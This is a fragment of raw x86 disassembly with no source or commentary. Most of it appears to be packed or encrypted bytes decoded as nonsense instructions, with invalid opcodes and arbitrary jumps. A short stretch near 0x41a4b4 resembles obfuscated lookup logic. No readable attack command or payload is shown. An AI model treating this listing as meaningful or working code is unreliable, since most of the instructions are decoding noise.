  41a0d7:	aaa    
  41a0d8:	pop    edx
  41a0d9:	dec    ebx
  41a0da:	dec    ecx
  41a0db:	inc    dl
  41a0dd:	xchg   esp,eax
  41a0de:	bound  esi,QWORD PTR [eax-0x43c2011b]
  41a0e4:	adc    al,0xbe
  41a0e6:	or     al,0x7a
  41a0e8:	push   0xb43a8b3a
  41a0ed:	xchg   esi,eax
  41a0ee:	popf   
  41a0ef:	add    ch,BYTE PTR [esi-0x4e]
  41a0f2:	js     0x41a089
  41a0f4:	jb     0x41a0a9
  41a0f6:	fsubp  st(6),st
  41a0f8:	lods   eax,DWORD PTR ds:[esi]
  41a0f9:	jge    0x41a167
  41a0fb:	test   BYTE PTR [ecx-0x5a389330],dh
  41a101:	inc    edx
  41a102:	ins    DWORD PTR es:[edi],dx
  41a103:	cmp    BYTE PTR [ebp+0x5c],bh
  41a106:	inc    ecx
  41a107:	jge    0x41a15d
  41a109:	adc    eax,0xd411b051
  41a10e:	enter  0x46b7,0x80
  41a112:	xchg   esp,eax
  41a113:	adc    DWORD PTR [ecx-0x6b],ebx
  41a116:	std    
  41a117:	cs and bl,cl
  41a11a:	add    ebp,eax
  41a11c:	add    ah,BYTE PTR [ecx]
  41a11e:	repnz jecxz 0x41a185
  41a121:	and    DWORD PTR [ebp-0x160eccd],0x80dcb7f2
  41a12b:	stos   DWORD PTR es:[edi],eax
  41a12c:	and    cl,al
  41a12e:	shl    BYTE PTR [esi+edx*8+0x5ca1e939],0xda
  41a136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a137:	xor    eax,0x5c9d9169
  41a13c:	fwait
  41a13d:	pop    edx
  41a13e:	pop    ebx
  41a13f:	enter  0x6b8a,0x0
  41a143:	cmp    DWORD PTR [edi+0x74e3a3e1],0x4a
  41a14a:	and    dh,dh
  41a14c:	jge    0x41a0e8
  41a14e:	dec    BYTE PTR [edi-0x733e5b2b]
  41a154:	sub    BYTE PTR [ebx+0x3fe2f848],dh
  41a15a:	mov    bh,0x9d
  41a15c:	in     al,0xaa
  41a15e:	lahf   
  41a15f:	jns    0x41a138
  41a161:	sahf   
  41a162:	pop    ebx
  41a163:	enter  0x1530,0x75
  41a167:	adc    BYTE PTR [ebx],0x63
  41a16a:	inc    eax
  41a16b:	fbld   TBYTE PTR [ebx-0x4c]
  41a16e:	pushf  
  41a16f:	pop    ds
  41a170:	add    al,0xe2
  41a172:	xor    ah,BYTE PTR [esi+0xfdce3a0]
  41a178:	jb     0x41a14f
  41a17a:	pop    es
  41a17b:	and    BYTE PTR [edx+ebp*4],ch
  41a17e:	ss in  eax,0x6
  41a181:	aaa    
  41a182:	inc    ebp
  41a183:	fimul  DWORD PTR [bp+di+0x7b71]
  41a188:	shl    ch,cl
  41a18a:	and    ebp,ebx
  41a18c:	scas   eax,DWORD PTR es:[edi]
  41a18d:	es adc ch,al
  41a190:	(bad)  
  41a191:	or     BYTE PTR [ecx-0x17c4456],ch
  41a197:	pusha  
  41a198:	gs jno 0x41a1eb
  41a19b:	(bad)  
  41a19c:	fnsave [esi+0x62cc32aa]
  41a1a2:	sub    edi,DWORD PTR [edx-0x78]
  41a1a5:	add    BYTE PTR [ebx-0x18],al
  41a1a8:	xchg   ebp,eax
  41a1a9:	or     cl,BYTE PTR [ecx-0x2e393bc2]
  41a1af:	ja     0x41a1af
  41a1b1:	mov    eax,ds:0x6e446903
  41a1b6:	sub    al,0x5b
  41a1b8:	mov    ds:0x4e7c0ea2,eax
  41a1bd:	xor    BYTE PTR [ebx+0x102ba4e8],ch
  41a1c3:	(bad)  
  41a1c5:	clc    
  41a1c6:	mov    eax,0xfe13cb86
  41a1cb:	ss out 0xac,al
  41a1ce:	test   eax,0x5642a52a
  41a1d3:	ret    0x4412
  41a1d6:	daa    
  41a1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d8:	out    0xe7,al
  41a1da:	add    ecx,0xfffffffc
  41a1dd:	loope  0x41a19c
  41a1df:	ja     0x41a209
  41a1e1:	sbb    al,0x4d
  41a1e3:	cmp    DWORD PTR [esi],edx
  41a1e5:	pop    es
  41a1e6:	or     dl,ch
  41a1e8:	dec    ebp
  41a1e9:	or     ebx,DWORD PTR [ebx]
  41a1eb:	lock jle 0x41a19c
  41a1ee:	mov    ah,0xad
  41a1f0:	cs call 0x122e:0x284d9138
  41a1f8:	xchg   dh,bl
  41a1fa:	les    eax,FWORD PTR [eax-0x2c3f53ef]
  41a200:	add    eax,0x35068acd
  41a205:	add    eax,0xcc53ddb0
  41a20a:	jge    0x41a24b
  41a20c:	shr    BYTE PTR [ebp-0x71],1
  41a20f:	test   al,0xbc
  41a211:	(bad)  
  41a212:	sbb    al,0xa8
  41a214:	out    dx,eax
  41a215:	mov    dh,0x13
  41a217:	js     0x41a23c
  41a219:	call   0xc5a4be5
  41a21e:	mov    eax,0x863efdca
  41a223:	pop    ecx
  41a224:	adc    bh,al
  41a226:	mov    bh,0x99
  41a228:	arpl   WORD PTR [edi-0x1d87871b],di
  41a22e:	fwait
  41a22f:	stc    
  41a230:	stos   DWORD PTR es:[edi],eax
  41a231:	or     al,0xd9
  41a233:	loop   0x41a28c
  41a235:	lock sbb edx,edi
  41a238:	je     0x41a23d
  41a23a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a23b:	pop    esp
  41a23c:	das    
  41a23d:	inc    edx
  41a23e:	nop
  41a23f:	iret   
  41a240:	popa   
  41a241:	sbb    bl,BYTE PTR [esi+eax*2+0x57]
  41a245:	jle    0x41a20d
  41a247:	or     ah,bl
  41a249:	cmp    BYTE PTR [edx-0xae96d1f],0x33
  41a250:	mov    edx,0xcf5f8180
  41a255:	les    edi,FWORD PTR [eax]
  41a257:	xchg   ebx,eax
  41a258:	ds push eax
  41a25a:	jmp    0x7b5f:0x75f7d2e3
  41a261:	jno    0x41a293
  41a263:	jne    0x41a2b1
  41a265:	inc    ebx
  41a266:	jl     0x41a245
  41a268:	imul   edi,DWORD PTR [esi+0x54],0xa5ee2626
  41a26f:	mov    esi,0x4cd57409
  41a274:	pop    edi
  41a275:	mov    ch,BYTE PTR [ebp-0x7a2ed28b]
  41a27b:	mov    eax,ebp
  41a27d:	(bad)  
  41a27e:	mov    ch,dh
  41a280:	idiv   BYTE PTR [ebx]
  41a282:	aam    0x25
  41a284:	xor    ah,BYTE PTR [esi-0x36]
  41a287:	sahf   
  41a288:	dec    eax
  41a289:	mov    ebp,0x46e62433
  41a28e:	and    ah,BYTE PTR [eax+0x7602a5cb]
  41a294:	jle    0x41a2a3
  41a296:	aam    0xd7
  41a298:	mov    al,ds:0x8903fb40
  41a29d:	jo     0x41a282
  41a29f:	or     al,0xf3
  41a2a1:	push   ecx
  41a2a2:	jae    0x41a279
  41a2a4:	sub    al,0x71
  41a2a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2a7:	jae    0x41a238
  41a2a9:	in     eax,dx
  41a2aa:	out    0x12,al
  41a2ac:	out    0xc1,al
  41a2ae:	mov    ds:0xd320bd37,al
  41a2b3:	or     DWORD PTR [edx],eax
  41a2b5:	dec    ebx
  41a2b6:	or     dl,BYTE PTR [ecx]
  41a2b8:	je     0x41a2c7
  41a2ba:	fs pop eax
  41a2bc:	mov    bh,ch
  41a2be:	out    dx,al
  41a2bf:	push   ss
  41a2c0:	jmp    0x70a2f998
  41a2c5:	mov    eax,?
  41a2c7:	jns    0x41a288
  41a2c9:	mov    WORD PTR [esi+0x0],cs
  41a2cc:	cli    
  41a2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ce:	adc    al,0xa8
  41a2d0:	aaa    
  41a2d1:	sbb    al,0xe4
  41a2d3:	imul   DWORD PTR [edi+0x12f68118]
  41a2d9:	pop    esp
  41a2da:	and    al,0xe
  41a2dc:	or     cl,al
  41a2de:	js     0x41a283
  41a2e0:	imul   ecx,DWORD PTR [ebx+0x75],0xffffff98
  41a2e4:	cmp    BYTE PTR [ecx],0xfc
  41a2e7:	push   ss
  41a2e8:	shr    ebx,cl
  41a2ea:	loope  0x41a36b
  41a2ec:	xchg   esp,eax
  41a2ed:	push   esp
  41a2ee:	mov    edi,0x3200e8d0
  41a2f3:	imul   ecx,DWORD PTR [ebx],0xffffff81
  41a2f6:	and    DWORD PTR [edi],esi
  41a2f8:	retf   0x78f
  41a2fb:	imul   esi,DWORD PTR [ecx-0x2a],0x22
  41a2ff:	mov    eax,DWORD PTR [esi-0x4f5da2a0]
  41a305:	pop    es
  41a306:	rcl    DWORD PTR [ecx+0x16],cl
  41a309:	cwde   
  41a30a:	in     al,0x2e
  41a30c:	gs xchg ecx,eax
  41a30e:	mov    DWORD PTR [eax-0x5e],esp
  41a311:	aad    0x24
  41a313:	aas    
  41a314:	lahf   
  41a315:	mov    BYTE PTR [esi-0x20ab3a39],ah
  41a31b:	div    DWORD PTR [edx]
  41a31d:	dec    esp
  41a31e:	mov    ds:0xc6de2fd5,al
  41a323:	sbb    DWORD PTR [esi+0x1abaeef9],0xffffff89
  41a32a:	jmp    0x41a30a
  41a32c:	loope  0x41a318
  41a32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a32f:	mov    eax,0x187d8df
  41a334:	inc    eax
  41a335:	sbb    edx,ecx
  41a337:	pop    ebx
  41a338:	stos   BYTE PTR es:[edi],al
  41a339:	cmp    al,0xa7
  41a33b:	jle    0x41a39c
  41a33d:	fstp   DWORD PTR [ecx+0xb]
  41a340:	and    BYTE PTR es:[edx+edx*8],ah
  41a344:	xchg   edi,eax
  41a345:	mov    bh,0x7f
  41a347:	inc    eax
  41a348:	and    eax,0x769d996d
  41a34d:	loope  0x41a2d7
  41a34f:	fist   WORD PTR [edi+edx*4]
  41a352:	sub    ch,cl
  41a354:	dec    esp
  41a355:	mov    dl,0xe0
  41a357:	jnp    0x41a371
  41a359:	lods   al,BYTE PTR ds:[esi]
  41a35a:	jl     0x41a3a1
  41a35c:	dec    eax
  41a35d:	cmp    eax,0x7e3d06cc
  41a362:	in     al,0x7b
  41a364:	stc    
  41a365:	push   eax
  41a366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a367:	sub    al,0x1e
  41a369:	inc    esi
  41a36a:	fmulp  st(6),st
  41a36c:	repz pushf 
  41a36e:	call   0xe1c0:0x53cf3ac
  41a375:	or     eax,ebp
  41a377:	(bad)  
  41a378:	mov    cl,0xad
  41a37a:	sub    BYTE PTR [ebp-0xe932b97],bh
  41a380:	pop    es
  41a381:	lock fst DWORD PTR [edx]
  41a384:	inc    edx
  41a385:	inc    edx
  41a386:	jmp    FWORD PTR [ecx-0x5fa1fe1e]
  41a38c:	fwait
  41a38d:	xor    esp,DWORD PTR [eax]
  41a38f:	xor    BYTE PTR [ebp-0x1b],al
  41a392:	daa    
  41a393:	or     eax,0x2b626851
  41a398:	out    dx,al
  41a399:	pop    ecx
  41a39a:	aad    0x30
  41a39c:	jp     0x41a3e7
  41a39e:	daa    
  41a39f:	or     eax,0xd9c5f04f
  41a3a4:	sbb    ch,BYTE PTR [ecx-0x612b3ec3]
  41a3aa:	loope  0x41a3f4
  41a3ac:	xchg   esp,eax
  41a3ad:	loopne 0x41a3c4
  41a3af:	xchg   esi,eax
  41a3b0:	xor    al,0x61
  41a3b2:	arpl   dx,sp
  41a3b4:	les    ebp,FWORD PTR [ecx+ebp*2-0x42af3e95]
  41a3bb:	pop    edx
  41a3bc:	mov    ecx,0xf5d987c0
  41a3c1:	call   DWORD PTR fs:[ecx-0x57]
  41a3c5:	jp     0x41a36f
  41a3c7:	sbb    ch,dh
  41a3c9:	out    dx,eax
  41a3ca:	popf   
  41a3cb:	cli    
  41a3cc:	outs   dx,DWORD PTR ds:[esi]
  41a3cd:	(bad)  
  41a3ce:	pop    ds
  41a3cf:	sbb    al,0x45
  41a3d1:	and    dl,BYTE PTR [esi-0x55926582]
  41a3d7:	sub    dl,dl
  41a3d9:	arpl   WORD PTR [esi-0xf1e9185],bx
  41a3df:	or     BYTE PTR [edx],al
  41a3e1:	es push ebx
  41a3e3:	jmp    0x56e5:0x3b788883
  41a3ea:	mov    ebx,0x9c35bbf1
  41a3ef:	fwait
  41a3f0:	std    
  41a3f1:	dec    ebx
  41a3f2:	add    BYTE PTR [ecx+0x5abd343d],dl
  41a3f8:	sti    
  41a3f9:	mov    ecx,0xbbe86043
  41a3fe:	leave  
  41a3ff:	dec    ecx
  41a400:	mov    esp,0xf2d39871
  41a405:	add    al,0x23
  41a407:	mov    cl,0x7f
  41a409:	sub    bl,BYTE PTR [edi+0x47]
  41a40c:	xchg   edi,eax
  41a40d:	retf   0xc48c
  41a410:	popf   
  41a411:	push   esi
  41a412:	popa   
  41a413:	call   0xf1c4:0x72ed8a3
  41a41a:	fwait
  41a41b:	mov    edx,fs
  41a41d:	cmp    dl,bh
  41a41f:	jo     0x41a403
  41a421:	loop   0x41a478
  41a423:	mov    bl,dl
  41a425:	push   ss
  41a426:	fnstcw WORD PTR [ebp+0x9]
  41a429:	jle    0x41a488
  41a42b:	jmp    0x41a3be
  41a42d:	jge    0x41a3fc
  41a42f:	fisub  WORD PTR [esi+ebp*2-0x7465ff84]
  41a436:	int    0x1c
  41a438:	mov    eax,ds:0xd7f05aad
  41a43d:	jecxz  0x41a4b8
  41a43f:	push   ebx
  41a440:	jmp    0x12f4:0xc4b90aa2
  41a447:	aad    0xb1
  41a449:	add    bh,ch
  41a44b:	popf   
  41a44c:	push   ds
  41a44d:	(bad)  
  41a44e:	xchg   ebx,eax
  41a44f:	xlat   BYTE PTR ds:[ebx]
  41a450:	gs xchg esi,eax
  41a452:	sbb    DWORD PTR [esi],0x90af6a1f
  41a458:	int    0xd
  41a45a:	lods   eax,DWORD PTR ds:[esi]
  41a45b:	pop    edi
  41a45c:	(bad)  [ebp+0x160c45c2]
  41a462:	sbb    DWORD PTR [ecx-0x54c62dfe],0xc
  41a469:	jns    0x41a4dd
  41a46b:	sub    esp,DWORD PTR [ebx-0x45c9bd76]
  41a471:	cmp    ebp,0x1e
  41a474:	add    al,0x4b
  41a476:	rol    BYTE PTR [edi+0x330c6583],0xd2
  41a47d:	cmp    DWORD PTR [eax],ebp
  41a47f:	clc    
  41a480:	test   DWORD PTR [edi+0x36],edx
  41a483:	in     al,dx
  41a484:	inc    edx
  41a485:	popa   
  41a486:	adc    BYTE PTR [ecx-0x173ac456],al
  41a48c:	mov    al,BYTE PTR [ebp-0x62393f70]
  41a492:	ins    DWORD PTR es:[edi],dx
  41a493:	and    edx,DWORD PTR [esi-0x513722c9]
  41a499:	inc    ecx
  41a49a:	out    0x37,al
  41a49c:	xor    al,0x67
  41a49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49f:	cld    
  41a4a0:	hlt    
  41a4a1:	pop    esi
  41a4a2:	das    
  41a4a3:	call   0xfc58:0x4e4787e4
  41a4aa:	mov    es,WORD PTR [eax]
  41a4ac:	xor    eax,0xafb952d
  41a4b1:	(bad)  
  41a4b2:	jmp    0x41a498
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x5d15a3ab]
  41a500:	loopne 0x41a54a
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x8]
  41a50a:	icebp  
  41a50b:	cwde   
  41a50c:	and    DWORD PTR [edi+0x37],eax
  41a50f:	add    BYTE PTR [edi],al
  41a511:	lods   eax,DWORD PTR ds:[esi]
  41a512:	inc    ax
  41a514:	aad    0x12
  41a516:	jle    0x41a4bd
  41a518:	mov    eax,ds:0xaa6751e2
  41a51d:	pop    eax
  41a51e:	call   ecx
  41a520:	fucompp 
  41a522:	pusha  
  41a523:	cli    
  41a524:	mov    dh,0xce
  41a526:	push   edi
  41a527:	jp     0x41a52e
  41a529:	nop
  41a52a:	ds xor eax,0xfb9ef94
  41a530:	mov    dl,0xee
  41a532:	or     cl,BYTE PTR [ebx+0x28]
  41a535:	das    
  41a536:	std    
  41a537:	bound  edx,QWORD PTR [eax+0x3de7d30a]
  41a53d:	ror    BYTE PTR [eax],0x8d
  41a540:	ins    DWORD PTR es:[edi],dx
  41a541:	inc    eax
  41a542:	out    dx,al
  41a543:	mov    WORD PTR es:[ecx-0x4f],cs
  41a547:	rcr    dl,cl
  41a549:	fcmovb st,st(3)
  41a54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54c:	cmp    dl,BYTE PTR [esp+eax*1-0x15f00a0f]
  41a553:	ins    DWORD PTR es:[edi],dx
  41a554:	sub    al,ch
  41a556:	ret    
  41a557:	mov    dl,0x5a
  41a559:	(bad)  
  41a55a:	pop    ss
  41a55b:	xor    esi,DWORD PTR [ebx+0x653cd77c]
  41a561:	not    ch
  41a563:	inc    eax
  41a564:	dec    ebx
  41a565:	mov    cl,BYTE PTR [ebx]
  41a567:	lods   eax,DWORD PTR ds:[esi]
  41a568:	dec    esp
  41a569:	outs   dx,DWORD PTR ds:[esi]
  41a56a:	add    BYTE PTR [eax+0xba75b52],bh
  41a570:	mov    ebp,0x70ea8f56
  41a575:	adc    eax,edi
  41a577:	nop
  41a578:	sub    BYTE PTR [ecx-0x2e],bl
  41a57b:	jbe    0x41a51d
  41a57d:	dec    esp
  41a57e:	shl    ch,cl
  41a580:	stos   DWORD PTR es:[edi],eax
  41a581:	cmp    al,0x42
  41a583:	sub    BYTE PTR [edi],bl
  41a585:	jmp    0x37662803
  41a58a:	pop    ecx
  41a58b:	mov    es,esp
  41a58d:	aaa    
  41a58e:	and    DWORD PTR [ebp-0x71],0xd9b0f10a
  41a595:	inc    ebp
  41a596:	pop    edx
  41a597:	inc    esi
  41a598:	out    dx,eax
  41a599:	dec    esp
  41a59a:	add    al,dh
  41a59c:	out    dx,al
  41a59d:	adc    eax,0x6f920ae0
  41a5a2:	repz adc al,BYTE PTR [esi+0x22]
  41a5a6:	int    0xfe
  41a5a8:	mov    ds:0xd9c76de4,eax
  41a5ad:	add    ah,BYTE PTR [ebx-0x67]
  41a5b0:	aam    0xe8
  41a5b2:	pop    edx
  41a5b3:	and    ebp,ebx
  41a5b5:	ret    
  41a5b6:	daa    
  41a5b7:	dec    ebx
  41a5b8:	adc    bl,BYTE PTR [eax]
  41a5ba:	js     0x41a54c
  41a5bc:	jnp    0x41a57d
  41a5be:	cmp    bh,BYTE PTR [eax]
  41a5c0:	bound  edx,QWORD PTR [ebx+eiz*8+0x18]
  41a5c4:	xor    BYTE PTR gs:[eax-0x36b40d37],0xdb
  41a5cc:	nop
  41a5cd:	fbstp  TBYTE PTR [eax-0x1ff9f936]
  41a5d3:	or     BYTE PTR [esi+0x72eb485f],al
  41a5d9:	das    
  41a5da:	push   ecx
  41a5dc:	in     eax,0xa
  41a5de:	jp     0x41a5e5
  41a5e0:	push   edx
  41a5e1:	xor    ah,BYTE PTR [edx-0x13]
  41a5e4:	fiadd  WORD PTR [ebx-0xba89acc]
  41a5ea:	jl     0x41a624
  41a5ec:	or     DWORD PTR [edx+0x7f],0x22
  41a5f0:	pop    edi
  41a5f1:	arpl   WORD PTR [ebx],bx
  41a5f3:	jae    0x41a58c
  41a5f5:	jno    0x41a5e2
  41a5f7:	sub    ebp,eax
  41a5f9:	out    dx,eax
  41a5fa:	aas    
  41a5fb:	push   cs
  41a5fc:	(bad)  
  41a5fd:	loope  0x41a636
  41a5ff:	xor    DWORD PTR [ecx-0x63658675],edx
  41a605:	ja     0x41a5c8
  41a607:	sub    al,0x10
  41a609:	push   cs
  41a60a:	push   edi
  41a60b:	push   ss
  41a60c:	icebp  
  41a60d:	or     al,0x8f
  41a60f:	(bad)  
  41a610:	sbb    BYTE PTR [edx+edx*4+0x643faee4],dh
  41a617:	inc    ebx
  41a618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a619:	xlat   BYTE PTR ds:[ebx]
  41a61a:	sbb    DWORD PTR [edx],edi
  41a61c:	pop    esp
  41a61d:	stos   DWORD PTR es:[edi],eax
  41a61e:	pop    esp
  41a61f:	and    dl,ah
  41a621:	xlat   BYTE PTR ds:[ebx]
  41a622:	push   ebx
  41a623:	pop    esi
  41a624:	into   
  41a625:	adc    ebx,ebx
  41a627:	repnz cmp cl,BYTE PTR [ebx+0x40]
  41a62b:	int    0x7f
  41a62d:	fcmovnbe st,st(6)
  41a62f:	xor    eax,0x2358e4fc
  41a634:	in     al,dx
  41a635:	cmp    ebx,DWORD PTR ds:0x4238fde0
  41a63b:	sub    DWORD PTR [ebp+0x77e40f05],ebx
  41a641:	test   DWORD PTR [esp+eiz*4],0x32b91727
  41a648:	mov    bh,0x8b
  41a64a:	sbb    DWORD PTR [edx-0x68859d72],ebx
  41a650:	push   es
  41a651:	iret   
  41a652:	sbb    eax,0x405fb5a3
  41a657:	data16 in al,dx
  41a659:	ficomp DWORD PTR [edx-0x7c]
  41a65c:	fsubr  st(7),st
  41a65e:	sti    
  41a65f:	gs test eax,0x6424c8e0
  41a665:	jns    0x41a65d
  41a667:	bound  eax,QWORD PTR [eax+0x52cc7eb9]
  41a66d:	jp     0x41a5f6
  41a66f:	cli    
  41a670:	scas   al,BYTE PTR es:[edi]
  41a671:	jns    0x41a67b
  41a673:	fstp   DWORD PTR [edi]
  41a675:	pop    DWORD PTR [edx+ecx*8]
  41a678:	js     0x41a6c4
  41a67a:	mov    ch,bh
  41a67c:	pop    ebx
  41a67d:	cld    
  41a67e:	xchg   ebx,eax
  41a67f:	loop   0x41a6a6
  41a681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a682:	hlt    
  41a683:	(bad)  
  41a684:	scas   eax,DWORD PTR es:[edi]
  41a685:	aad    0x30
  41a687:	mov    esp,0xfe0271
  41a68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a68d:	mov    ecx,0x5364c4ca
  41a692:	add    eax,0x4d353496
  41a697:	adc    DWORD PTR [ecx],edx
  41a699:	jecxz  0x41a687
  41a69b:	xchg   BYTE PTR [esi],al
  41a69d:	jbe    0x41a6f9
  41a69f:	or     al,0x23
  41a6a1:	mov    ah,0x92
  41a6a3:	and    al,0x6c
  41a6a5:	in     al,dx
  41a6a6:	jp     0x41a662
  41a6a8:	pop    edi
  41a6a9:	and    ecx,eax
  41a6ab:	addr16 dec esi
  41a6ad:	imul   edx,DWORD PTR [edi],0x1e38aab0
  41a6b3:	adc    edi,edi
  41a6b5:	int3   
  41a6b6:	inc    esp
  41a6b7:	sbb    al,0xda
  41a6b9:	scas   al,BYTE PTR es:[edi]
  41a6ba:	pop    edi
  41a6bb:	icebp  
  41a6bc:	pop    ecx
  41a6bd:	mov    WORD PTR [ebx+0x78],ss
  41a6c0:	popf   
  41a6c1:	nop
  41a6c2:	sbb    BYTE PTR [edi],al
  41a6c4:	lea    esp,[ebx+0x7]
  41a6c7:	push   cs
  41a6c8:	ja     0x41a737
  41a6ca:	push   ebx
  41a6cb:	daa    
  41a6cc:	out    0x8c,al
  41a6ce:	(bad)  
  41a6cf:	and    al,0xae
  41a6d1:	cmp    bl,BYTE PTR [ebp+0x74]
  41a6d4:	aam    0xfa
  41a6d6:	mov    BYTE PTR [ecx-0x3a310bb1],ah
  41a6dc:	das    
  41a6dd:	lds    ebx,FWORD PTR ds:0x549b707d
  41a6e3:	jmp    0x41a732
  41a6e5:	mov    ds:0x45f00f0c,eax
  41a6ea:	add    edx,ebp
  41a6ec:	aas    
  41a6ed:	lahf   
  41a6ee:	sbb    ebp,DWORD PTR [edx-0x3ba5ba78]
  41a6f4:	mov    edi,0xf71bec4d
  41a6f9:	sub    al,dl
  41a6fb:	mov    ebx,0x32770be0
  41a700:	mov    ebp,0x8acfa6d
  41a705:	sbb    al,0x9b
  41a707:	mov    esi,0x2298dcb0
  41a70c:	inc    ebx
  41a70d:	ror    ecx,cl
  41a70f:	aas    
  41a710:	mov    al,0xa
  41a712:	dec    ebp
  41a713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a714:	push   esp
  41a715:	sub    DWORD PTR [eax-0x343e8462],edi
  41a71b:	pop    ecx
  41a71c:	mov    ?,WORD PTR [ebp+0x4e]
  41a71f:	aas    
  41a720:	shl    BYTE PTR [edx+0x612af7ed],1
  41a726:	jae    0x41a7a0
  41a728:	push   esp
  41a729:	add    al,0x4a
  41a72b:	adc    eax,0xfb830f1f
  41a730:	iret   
  41a731:	sub    al,0x54
  41a733:	push   eax
  41a734:	adc    eax,0x5720709f
  41a739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a73a:	je     0x41a6d0
  41a73c:	rcr    DWORD PTR [edi-0x7b96fbf4],cl
  41a742:	or     BYTE PTR [ebp+ebp*2+0x45],dl
  41a746:	(bad)  
  41a747:	sbb    BYTE PTR [edx],bl
  41a749:	push   edx
  41a74a:	push   0x654865e1
  41a74f:	cmp    DWORD PTR [edx-0x6],0xfffffffa
  41a753:	or     al,0xd9
  41a755:	daa    
  41a756:	add    ecx,DWORD PTR [edx+esi*8+0xfd36d63]
  41a75d:	add    eax,0x7de76903
  41a762:	into   
  41a763:	les    ecx,FWORD PTR [edx-0x64]
  41a766:	(bad)  
  41a767:	xchg   ebx,eax
  41a768:	mov    dh,0xef
  41a76a:	scas   al,BYTE PTR es:[edi]
  41a76b:	sub    BYTE PTR [edi-0x36],0xdb
  41a76f:	stos   DWORD PTR es:[edi],eax
  41a770:	xchg   ebp,eax
  41a771:	cmp    al,0xa7
  41a773:	and    edi,ebx
  41a775:	mov    ch,0x1e
  41a777:	xchg   edx,eax
  41a778:	jle    0x41a7e2
  41a77a:	pop    ss
  41a77b:	mov    ecx,0x44cb3ea4
  41a780:	and    BYTE PTR [edx+0x24],bl
  41a783:	pop    ebx
  41a784:	int3   
  41a785:	popa   
  41a786:	inc    esi
  41a787:	sbb    dh,BYTE PTR [ebp+0x2885cf3]
  41a78d:	cmp    eax,0xa1ba6e86
  41a792:	or     ebx,DWORD PTR [edx+0x37]
  41a795:	xchg   ebp,eax
  41a796:	push   esp
  41a797:	test   BYTE PTR ss:[eax+0x63],0xfc
  41a79c:	pusha  
  41a79d:	or     dl,cl
  41a79f:	mov    cl,0xbc
  41a7a1:	adc    BYTE PTR [eax-0x710c822e],bh
  41a7a7:	xor    eax,0x3bef24d5
  41a7ac:	int3   
  41a7ad:	out    0x8e,al
  41a7af:	push   cs
  41a7b0:	push   ds
  41a7b1:	mov    esi,0x32631c4d
  41a7b6:	push   0xf763aed9
  41a7bb:	sub    DWORD PTR [esi],ebp
  41a7bd:	xchg   edx,eax
  41a7be:	and    ch,BYTE PTR [edi]
  41a7c0:	push   esi
  41a7c1:	(bad)  
  41a7c2:	sbb    al,0xe
  41a7c4:	jne    0x41a78f
  41a7c6:	mov    dh,0xf0
  41a7c8:	push   ecx
  41a7c9:	xchg   ebx,eax
  41a7ca:	pop    edi
  41a7cb:	(bad)  
  41a7cd:	data16 jb 0x41a83b
  41a7d0:	cmp    esp,DWORD PTR [eax+ebp*4+0x7fc9250e]
  41a7d7:	and    ch,BYTE PTR ds:0x1862
  41a7dc:	mov    WORD PTR [ebp+0x42ffec08],ds
  41a7e2:	loope  0x41a85d
  41a7e4:	push   edx
  41a7e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7e7:	mov    edx,0x1a9117e2
  41a7ec:	leave  
  41a7ed:	mov    al,ds:0x7e91e35d
  41a7f2:	xor    al,0x1f
  41a7f4:	dec    ebp
  41a7f5:	cmp    ebx,edi
  41a7f7:	loope  0x41a7d7
  41a7f9:	out    dx,eax
  41a7fa:	jb     0x41a873
  41a7fc:	adc    BYTE PTR [edx+0x1d],0x22
  41a800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a801:	xchg   BYTE PTR [eax],dh
  41a803:	ds adc al,0xa9
  41a806:	xchg   edx,esp
  41a808:	scas   al,BYTE PTR es:[edi]
  41a809:	dec    ebx
  41a80a:	pop    esp
  41a80b:	jb     0x41a82f
  41a80d:	xchg   ebx,eax
  41a80e:	mov    ds:0xd6b6b113,eax
  41a813:	ss pop ds
  41a815:	xchg   ebx,eax
  41a816:	hlt    
  41a817:	ja     0x41a821
  41a819:	mov    ch,BYTE PTR fs:0xa8b562da
  41a820:	lahf   
  41a821:	pop    ss
  41a822:	mov    ds:0x56478660,al
  41a827:	mov    WORD PTR [eax],es
  41a829:	das    
  41a82a:	mov    eax,es:0x608d29a4
  41a830:	and    al,0x2b
  41a832:	leave  
